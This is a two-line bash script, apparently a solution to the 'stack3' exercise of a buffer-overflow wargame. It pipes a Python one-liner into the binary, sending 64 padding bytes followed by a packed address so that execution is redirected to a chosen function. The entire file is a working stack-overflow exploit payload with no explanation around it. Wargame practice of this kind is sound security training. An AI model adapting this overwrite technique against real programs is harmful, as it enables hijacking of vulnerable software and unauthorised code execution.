#!/usr/bin/bash

python -c 'from struct import pack as p; print "A" * 64 + p("<L",0x08048424)' | ./stack3
